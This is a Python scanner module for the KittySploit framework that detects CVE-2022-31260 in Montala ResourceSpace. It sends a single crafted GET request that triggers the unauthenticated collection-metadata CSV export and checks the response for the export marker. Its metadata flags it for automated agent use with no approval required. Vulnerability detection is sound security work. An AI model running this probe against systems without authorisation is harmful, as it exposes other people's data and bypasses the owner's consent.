#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In Montala ResourceSpace through 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ResourceSpace - Metadata Export Detection',
        'description': 'In Montala ResourceSpace through 9.8 before r19636, csv_export_results_metadata.php allows attackers to export collection metadata via a non-NULL k value.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'resourcespace', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/grymer/CVE/blob/master/CVE-2022-31260.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-31260',
        ],
        'cve': 'CVE-2022-31260',
    }

    def run(self):
        path = '/pages/csv_export_results_metadata.php?k=zulu&personaldata=0&allavailable=true&submit=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('CSV-Export -',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='ResourceSpace - Metadata Export detected', path=path)
            return True
        return False

